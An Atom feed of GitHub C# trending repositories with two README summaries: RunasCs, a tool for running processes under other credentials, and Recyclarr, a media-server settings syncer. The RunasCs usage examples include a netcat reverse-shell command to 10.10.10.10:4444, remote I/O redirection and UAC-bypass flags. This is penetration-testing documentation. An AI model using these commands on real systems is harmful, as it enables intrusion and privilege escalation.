<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2025-01-07T01:29:16Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>antonioCoco/RunasCs</title>
    <updated>2025-01-07T01:29:16Z</updated>
    <id>tag:github.com,2025-01-07:/antonioCoco/RunasCs</id>
    <link href="https://github.com/antonioCoco/RunasCs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;RunasCs - Csharp and open version of windows builtin runas.exe&lt;/p&gt;&lt;hr&gt;&lt;h3&gt;RunasCs&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;em&gt;RunasCs&lt;/em&gt; is an utility to run specific processes with different permissions than the user&#39;s current logon provides using explicit credentials. This tool is an improved and open version of windows builtin &lt;em&gt;runas.exe&lt;/em&gt; that solves some limitations:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Allows explicit credentials&lt;/li&gt; &#xA; &lt;li&gt;Works both if spawned from interactive process and from service process&lt;/li&gt; &#xA; &lt;li&gt;Manage properly &lt;em&gt;DACL&lt;/em&gt; for &lt;em&gt;Window Stations&lt;/em&gt; and &lt;em&gt;Desktop&lt;/em&gt; for the creation of the new process&lt;/li&gt; &#xA; &lt;li&gt;Uses more reliable create process functions like &lt;code&gt;CreateProcessAsUser()&lt;/code&gt; and &lt;code&gt;CreateProcessWithTokenW()&lt;/code&gt; if the calling process holds the required privileges (automatic detection)&lt;/li&gt; &#xA; &lt;li&gt;Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no &lt;em&gt;UAC&lt;/em&gt; limitations)&lt;/li&gt; &#xA; &lt;li&gt;Allows to bypass UAC when an administrator password is known (flag --bypass-uac)&lt;/li&gt; &#xA; &lt;li&gt;Allows to create a process with the main thread impersonating the requested user (flag --remote-impersonation)&lt;/li&gt; &#xA; &lt;li&gt;Allows redirecting &lt;em&gt;stdin&lt;/em&gt;, &lt;em&gt;stdout&lt;/em&gt; and &lt;em&gt;stderr&lt;/em&gt; to a remote host&lt;/li&gt; &#xA; &lt;li&gt;It&#39;s Open Source :)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;em&gt;RunasCs&lt;/em&gt; has an automatic detection to determine the best create process function for every contexts. Based on the process caller token permissions, it will use one of the create process function in the following preferred order:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;code&gt;CreateProcessAsUserW()&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;CreateProcessWithTokenW()&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;CreateProcessWithLogonW()&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Requirements&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;.NET Framework &amp;gt;= 2.0&lt;/p&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;RunasCs v1.5 - @splinter_code&#xA;&#xA;Usage:&#xA;    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]&#xA;&#xA;Description:&#xA;    RunasCs is an utility to run specific processes under a different user account&#xA;    by specifying explicit credentials. In contrast to the default runas.exe command&#xA;    it supports different logon types and CreateProcess* functions to be used, depending&#xA;    on your current permissions. Furthermore it allows input/output redirection (even&#xA;    to remote hosts) and you can specify the password directly on the command line.&#xA;&#xA;Positional arguments:&#xA;    username                username of the user&#xA;    password                password of the user&#xA;    cmd                     commandline for the process&#xA;&#xA;Optional arguments:&#xA;    -d, --domain domain&#xA;                            domain of the user, if in a domain.&#xA;                            Default: &#34;&#34;&#xA;    -f, --function create_process_function&#xA;                            CreateProcess function to use. When not specified&#xA;                            RunasCs determines an appropriate CreateProcess&#xA;                            function automatically according to your privileges.&#xA;                            0 - CreateProcessAsUserW&#xA;                            1 - CreateProcessWithTokenW&#xA;                            2 - CreateProcessWithLogonW&#xA;    -l, --logon-type logon_type&#xA;                            the logon type for the token of the new process.&#xA;                            Default: &#34;2&#34; - Interactive&#xA;    -t, --timeout process_timeout&#xA;                            the waiting time (in ms) for the created process.&#xA;                            This will halt RunasCs until the spawned process&#xA;                            ends and sent the output back to the caller.&#xA;                            If you set 0 no output will be retrieved and a&#xA;                            background process will be created.&#xA;                            Default: &#34;120000&#34;&#xA;    -r, --remote host:port&#xA;                            redirect stdin, stdout and stderr to a remote host.&#xA;                            Using this option sets the process_timeout to 0.&#xA;    -p, --force-profile&#xA;                            force the creation of the user profile on the machine.&#xA;                            This will ensure the process will have the&#xA;                            environment variables correctly set.&#xA;                            WARNING: If non-existent, it creates the user profile&#xA;                            directory in the C:\Users folder.&#xA;    -b, --bypass-uac&#xA;                            try a UAC bypass to spawn a process without&#xA;                            token limitations (not filtered).&#xA;    -i, --remote-impersonation&#xA;                            spawn a new process and assign the token of the&#xA;                            logged on user to the main thread.&#xA;&#xA;Examples:&#xA;    Run a command as a local user&#xA;        RunasCs.exe user1 password1 &#34;cmd /c whoami /all&#34;&#xA;    Run a command as a domain user and logon type as NetworkCleartext (8)&#xA;        RunasCs.exe user1 password1 &#34;cmd /c whoami /all&#34; -d domain -l 8&#xA;    Run a background process as a local user,&#xA;        RunasCs.exe user1 password1 &#34;C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe&#34; -t 0&#xA;    Redirect stdin, stdout and stderr of the specified command to a remote host&#xA;        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444&#xA;    Run a command simulating the /netonly flag of runas.exe&#xA;        RunasCs.exe user1 password1 &#34;cmd /c whoami /all&#34; -l 9&#xA;    Run a command as an Administrator bypassing UAC&#xA;        RunasCs.exe adm1 password1 &#34;cmd /c whoami /priv&#34; --bypass-uac&#xA;    Run a command as an Administrator through remote impersonation&#xA;        RunasCs.exe adm1 password1 &#34;cmd /c echo admin &amp;gt; C:\Windows\admin&#34; -l 8 --remote-impersonation&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The two processes (calling and called) will communicate through one &lt;em&gt;pipe&lt;/em&gt; (both for &lt;em&gt;stdout&lt;/em&gt; and &lt;em&gt;stderr&lt;/em&gt;). The default logon type is 2 (&lt;em&gt;Interactive&lt;/em&gt;).&lt;/p&gt; &#xA;&lt;p&gt;By default, the &lt;em&gt;Interactive&lt;/em&gt; (2) logon type is restricted by &lt;em&gt;UAC&lt;/em&gt; and the generated token from these authentications are filtered. You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Otherwise, you can try the flag &lt;strong&gt;--bypass-uac&lt;/strong&gt; for an attempt in bypassing the token filtering limitation.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;NetworkCleartext (8)&lt;/strong&gt; logon type is the one with the widest permissions as it doesn&#39;t get filtered by UAC in local tokens and still allows authentications over the Network as it stores credentials in the authentication package. If you holds enough privileges, try to always specify this logon type through the flag --logon-type 8.&lt;/p&gt; &#xA;&lt;p&gt;By default, the calling process (&lt;em&gt;RunasCs&lt;/em&gt;) will wait until the end of the execution of the spawned process. If you need to spawn a background or async process, i.e. spawning a reverse shell, you need to set the parameter &lt;code&gt;-t timeout&lt;/code&gt; to &lt;code&gt;0&lt;/code&gt;. In this case &lt;em&gt;RunasCs&lt;/em&gt; won&#39;t wait for the end of the newly spawned process execution.&lt;/p&gt; &#xA;&lt;h3&gt;References&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://decoder.cloud/2018/01/13/potato-and-tokens/&#34;&gt;Potatoes and tokens&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/previous-versions/aa379608(v=vs.85)&#34;&gt;Starting an Interactive Client Process in C++&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output&#34;&gt;Creating a Child Process with Redirected Input and Output&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/services/interactive-services&#34;&gt;Interactive Services&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blogs.msdn.microsoft.com/winsdk/2015/06/03/what-is-up-with-the-application-failed-to-initialize-properly-0xc0000142-error/&#34;&gt;What is up with &#34;The application failed to initialize properly (0xc0000142)&#34; error?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html&#34;&gt;Getting an Interactive Service Account Shell&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html&#34;&gt;Reading Your Way Around UAC (Part 1)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-2.html&#34;&gt;Reading Your Way Around UAC (Part 2)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html&#34;&gt;Reading Your Way Around UAC (Part 3)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dahall/Vanara&#34;&gt;Vanara - A set of .NET libraries for Windows implementing PInvoke calls to many native Windows APIs with supporting wrappers&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Credits&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/decoder-it&#34;&gt;@decoder&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/qtc-de&#34;&gt;@qtc-de&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/winlogon0&#34;&gt;@winlogon0&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>recyclarr/recyclarr</title>
    <updated>2025-01-07T01:29:16Z</updated>
    <id>tag:github.com,2025-01-07:/recyclarr/recyclarr</id>
    <link href="https://github.com/recyclarr/recyclarr" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Automatically sync TRaSH Guides to your Sonarr and Radarr instances&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Recyclarr&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/recyclarr/recyclarr/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/recyclarr/recyclarr&#34; alt=&#34;GitHub License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/recyclarr/recyclarr/actions/workflows/build.yml?query=branch%3Amaster&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/actions/workflow/status/recyclarr/recyclarr/build.yml?branch=master&amp;amp;logo=githubactions&#34; alt=&#34;Build Workflow Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://sonarcloud.io/summary/new_code?id=recyclarr_recyclarr&#34;&gt;&lt;img src=&#34;https://img.shields.io/sonar/quality_gate/recyclarr_recyclarr?server=https%3A%2F%2Fsonarcloud.io&amp;amp;logo=sonarcloud&#34; alt=&#34;Sonar Quality Gate&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/recyclarr/recyclarr/releases/&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/recyclarr/recyclarr?logo=github&#34; alt=&#34;GitHub Release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.com/invite/Vau8dZ3&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/492590071455940612?label=TRaSH-Guides&amp;amp;logo=discord&#34; alt=&#34;Discord&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A command-line application that will automatically synchronize recommended settings from the &lt;a href=&#34;https://trash-guides.info/&#34;&gt;TRaSH guides&lt;/a&gt; to your Sonarr/Radarr instances.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;p&gt;Recyclarr supports Radarr and Sonarr (v4 and higher only). The following information can be synced to these services from the TRaSH Guides. For a more detailed features list, see the &lt;a href=&#34;https://recyclarr.dev/wiki/features/&#34;&gt;Features&lt;/a&gt; page.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Quality Profiles, including qualities and quality groups&lt;/li&gt; &#xA; &lt;li&gt;Custom Formats, including scores (from guide or manual)&lt;/li&gt; &#xA; &lt;li&gt;Quality Definitions (file sizes)&lt;/li&gt; &#xA; &lt;li&gt;Media Naming Formats&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Read the Documentation&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://recyclarr.dev/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/view-Documentation-blue?style=for-the-badge&#34; alt=&#34;view - Documentation&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Main documentation is located in &lt;a href=&#34;https://recyclarr.dev/wiki&#34;&gt;the wiki&lt;/a&gt;. Links provided below for some main topics.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://recyclarr.dev/wiki/installation/&#34;&gt;Installation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://recyclarr.dev/wiki/cli/&#34;&gt;Command Line Reference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://recyclarr.dev/wiki/yaml/config-reference/&#34;&gt;Configuration Reference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://recyclarr.dev/wiki/yaml/settings-reference/&#34;&gt;Settings Reference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://recyclarr.dev/wiki/troubleshooting/help/&#34;&gt;Troubleshooting&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://recyclarr.dev/wiki/upgrade-guide/&#34;&gt;Upgrade Guides&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Supported By&lt;/h2&gt; &#xA;&lt;!-- markdownlint-disable MD033 MD013 --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.jetbrains.com/rider/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://resources.jetbrains.com/storage/products/company/brand/logos/Rider_icon.svg?sanitize=true&#34; alt=&#34;Jetbrains Rider&#34; style=&#34;margin-right: 10px;&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.jetbrains.com/qodana/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://resources.jetbrains.com/storage/products/company/brand/logos/Qodana_icon.svg?sanitize=true&#34; alt=&#34;Jetbrains Qodana&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;!-- markdownlint-enable MD033 MD013 --&gt;</summary>
  </entry>
</feed>